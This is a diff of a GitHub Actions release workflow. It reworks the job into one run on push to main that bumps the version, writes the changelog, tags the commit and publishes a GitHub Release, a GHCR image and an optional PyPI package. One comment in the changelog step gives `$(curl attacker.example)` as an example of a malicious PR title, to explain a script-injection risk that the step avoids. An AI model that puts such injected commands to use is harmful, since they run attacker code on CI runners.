@@ -1,85 +1,122 @@
 name: release
 
-# Publishing a version: push a tag matching v* (e.g. `git tag v0.1.0-beta &&
-# git push origin v0.1.0-beta`). This creates the GitHub Release for you
-# with auto-generated notes (commits/PRs merged since the previous tag) --
-# no need to hand-write release notes each time.
+# Single, self-contained release workflow: on every push to main it
+# decides whether a release is due, and if so does everything -- version
+# resolution, pyproject.toml bump, CHANGELOG.md, git tag, GitHub Release,
+# Docker image push, optional PyPI publish -- in this one job.
 #
-# A tag containing a hyphen (e.g. v0.1.0-beta, following semver's
-# pre-release convention) is published as a pre-release; a plain
-# vX.Y.Z tag is published as a normal release.
+# Deliberately NOT split into a tag-triggered second workflow. A tag or
+# commit pushed using the default GITHUB_TOKEN does not fire another
+# workflow's `on: push:` trigger (GitHub's anti-recursion protection), so
+# a two-stage design (this workflow tags -> a second workflow reacts to
+# the tag) can never complete on its own; this repo hit exactly that bug
+# once (see git history around v0.1.0-beta) and worked around it with
+# explicit `gh workflow run` dispatches. Doing everything in one job
+# sidesteps the problem entirely -- and that same anti-recursion
+# protection is what stops this workflow's own commit+tag push (below)
+# from re-triggering itself, so no extra guard is needed for that.
+#
+# Two ways a release happens:
+#   - Manual: bump `version` in pyproject.toml in a PR and merge it. This
+#     workflow sees pyproject.toml's version no longer matches the latest
+#     tag and releases exactly that version, verbatim (including whether
+#     it still carries a "-beta" suffix -- this is how the project
+#     graduates out of beta, deliberately, by hand).
+#   - Automatic: if nobody bumped the version, the next version is
+#     resolved from merged PRs' labels (fix/feature/major, see
+#     .github/release-drafter.yml and .github/workflows/pr-autolabel.yml)
+#     via release-drafter in dry-run mode (disable-releaser: true --
+#     creates no release, no tag, just resolves a version number), then
+#     `-beta` (or whatever suffix the latest tag had) is re-applied by
+#     .github/scripts/resolve_version.py.
 
 on:
   push:
-    tags:
-      - "v*"
-  # A tag pushed by tag-on-version-bump.yml (using the default GITHUB_TOKEN)
-  # does not fire the `push: tags:` trigger above -- GitHub blocks a
-  # GITHUB_TOKEN-authored push from cascading into other workflows' event
-  # triggers, to prevent recursive runs. That workflow explicitly dispatches
-  # this one (`gh workflow run release.yml --ref vX.Y.Z`) instead.
-  #
-  # A manual run must target `ref: main` (a workflow's `workflow_dispatch`
-  # eligibility is checked against its copy of the file AT THE GIVEN REF, not
-  # against the default branch -- dispatching against an old tag whose copy
-  # predates this trigger being added fails with "Workflow does not have
-  # 'workflow_dispatch' trigger"). Since `ref: main` means `github.ref_name`
-  # is "main", not the tag to release, the tag must be passed explicitly via
-  # this input instead.
-  workflow_dispatch:
-    inputs:
-      tag:
-        description: "Tag to release, e.g. v0.1.0-beta (must already exist)"
-        required: true
-        type: string
+    branches: [main]
+
+concurrency:
+  group: release
+  cancel-in-progress: false
 
 permissions:
   contents: write
+  packages: write
+  pull-requests: read
 
 jobs:
   release:
     runs-on: ubuntu-latest
     env:
-      TAG: ${{ github.event_name == 'workflow_dispatch' && inputs.tag || github.ref_name }}
+      PYPI_TOKEN: ${{ secrets.PYPI_API_TOKEN }}
     steps:
       - uses: actions/checkout@v4
         with:
-          ref: ${{ env.TAG }}
           fetch-depth: 0
 
-      - name: Create GitHub Release
-        id: release
-        env:
-          GH_TOKEN: ${{ github.token }}
+      - name: Determine current version and latest tag
+        id: current
         run: |
-          PRERELEASE_FLAG=""
-          if [[ "$TAG" == *-* ]]; then
-            PRERELEASE_FLAG="--prerelease"
+          CURRENT=$(grep -m1 '^version = ' pyproject.toml | sed -E 's/version = "(.*)"/\1/')
+          LATEST_TAG=$(git tag --list 'v*' --sort=-v:refname | head -n1)
+          LATEST_VERSION="${LATEST_TAG#v}"
+          echo "current=$CURRENT" >> "$GITHUB_OUTPUT"
+          echo "latest_tag=$LATEST_TAG" >> "$GITHUB_OUTPUT"
+          echo "latest_version=$LATEST_VERSION" >> "$GITHUB_OUTPUT"
+
+      # Only needed when nobody has manually bumped pyproject.toml yet.
+      # Dry run: disable-releaser skips creating/updating anything, this
+      # only resolves a version number from merged PRs' labels.
+      - name: Resolve next version from merged PR labels (dry run)
+        id: drafter
+        if: steps.current.outputs.latest_tag != '' && steps.current.outputs.current == steps.current.outputs.latest_version
+        uses: release-drafter/release-drafter@v6
+        with:
+          disable-releaser: true
+          disable-autolabeler: true
+        env:
+          GITHUB_TOKEN: ${{ github.token }}
+
+      - name: Decide the version to release, if any
+        id: decide
+        run: |
+          RESULT=$(python3 .github/scripts/resolve_version.py \
+            --current-version "${{ steps.current.outputs.current }}" \
+            --latest-tag-version "${{ steps.current.outputs.latest_version }}" \
+            --drafter-resolved "${{ steps.drafter.outputs.resolved_version }}")
+          echo "resolver said: $RESULT"
+          if [ "$RESULT" = "skip" ]; then
+            echo "should_release=false" >> "$GITHUB_OUTPUT"
+          else
+            echo "should_release=true" >> "$GITHUB_OUTPUT"
+            echo "version=${RESULT#release:}" >> "$GITHUB_OUTPUT"
           fi
-          gh release create "$TAG" \
-            --title "$TAG" \
-            --generate-notes \
-            $PRERELEASE_FLAG
-          gh release view "$TAG" --json body -q .body > /tmp/release-notes.md
 
-      - name: Record the release in CHANGELOG.md
-        env:
-          GH_TOKEN: ${{ github.token }}
+      - name: Update pyproject.toml's version, if this is an automatic bump
+        if: steps.decide.outputs.should_release == 'true' && steps.decide.outputs.version != steps.current.outputs.current
         run: |
-          git config user.name "github-actions[bot]"
-          git config user.email "github-actions[bot]@users.noreply.github.com"
+          sed -i "s/^version = \".*\"/version = \"${{ steps.decide.outputs.version }}\"/" pyproject.toml
 
-          # The tag can be behind main's current tip by the time this runs;
-          # commit the changelog entry onto main's actual tip, not the
-          # (possibly older) tagged commit.
-          git fetch origin main
-          git checkout main
-          git reset --hard origin/main
+      - name: Generate this release's CHANGELOG.md entry from git history
+        if: steps.decide.outputs.should_release == 'true'
+        run: |
+          TAG="v${{ steps.decide.outputs.version }}"
+          PREV="${{ steps.current.outputs.latest_tag }}"
 
+          # Reads commit subjects from the git object database at run time
+          # (this repo squash-merges every PR, so one subject == one PR
+          # title) rather than interpolating any PR/commit text into this
+          # (or any) shell string via `${{ }}` -- avoids the known GitHub
+          # Actions script-injection pattern where an untrusted title like
+          # `$(curl attacker.example)` gets evaluated instead of printed.
           {
             echo "## $TAG - $(date -u +%Y-%m-%d)"
             echo
-            cat /tmp/release-notes.md
+            if [ -n "$PREV" ]; then
+              git log --pretty=format:'- %s (%h)' "$PREV"..HEAD -- . ':!CHANGELOG.md'
+            else
+              git log --pretty=format:'- %s (%h)' -- . ':!CHANGELOG.md'
+            fi
+            echo
           } > /tmp/new-entry.md
 
           if [ -f CHANGELOG.md ]; then
@@ -89,6 +126,65 @@ jobs:
           fi
           mv /tmp/CHANGELOG.new CHANGELOG.md
 
-          git add CHANGELOG.md
-          git commit -m "Update CHANGELOG.md for $TAG"
-          git push origin main
+      - name: Commit the release, tag it, and push
+        if: steps.decide.outputs.should_release == 'true'
+        run: |
+          TAG="v${{ steps.decide.outputs.version }}"
+          git config user.name "github-actions[bot]"
+          git config user.email "github-actions[bot]@users.noreply.github.com"
+          git add pyproject.toml CHANGELOG.md
+          git commit -m "Release $TAG"
+          git tag -a "$TAG" -m "Release $TAG"
+          git push origin main "$TAG"
+
+      - name: Create the GitHub Release
+        if: steps.decide.outputs.should_release == 'true'
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          TAG="v${{ steps.decide.outputs.version }}"
+          PRERELEASE_FLAG=""
+          if [[ "$TAG" == *-* ]]; then
+            PRERELEASE_FLAG="--prerelease"
+          fi
+          # Read this release's own section back out of CHANGELOG.md
+          # (already generated, on disk) rather than re-embedding any
+          # commit/PR text into this script.
+          awk '/^## /{n++} n==1{print} n==2{exit}' CHANGELOG.md > /tmp/release-notes.md
+          gh release create "$TAG" --title "$TAG" --notes-file /tmp/release-notes.md $PRERELEASE_FLAG
+
+      - name: Log in to GHCR
+        if: steps.decide.outputs.should_release == 'true'
+        uses: docker/login-action@v3
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Compute Docker image tags
+        if: steps.decide.outputs.should_release == 'true'
+        id: dockertags
+        run: |
+          TAG="v${{ steps.decide.outputs.version }}"
+          IMAGE="ghcr.io/${{ github.repository }}"
+          TAGS="$IMAGE:$TAG"
+          # Only move :latest for real releases, not pre-releases.
+          if [[ "$TAG" != *-* ]]; then
+            TAGS="$TAGS,$IMAGE:latest"
+          fi
+          echo "tags=$TAGS" >> "$GITHUB_OUTPUT"
+
+      - name: Build and push the Docker image
+        if: steps.decide.outputs.should_release == 'true'
+        uses: docker/build-push-action@v6
+        with:
+          context: .
+          push: true
+          tags: ${{ steps.dockertags.outputs.tags }}
+
+      - name: Publish to PyPI, if a token is configured
+        if: steps.decide.outputs.should_release == 'true' && env.PYPI_TOKEN != ''
+        run: |
+          pip install --upgrade build twine
+          python3 -m build
+          python3 -m twine upload --non-interactive -u __token__ -p "$PYPI_TOKEN" dist/*
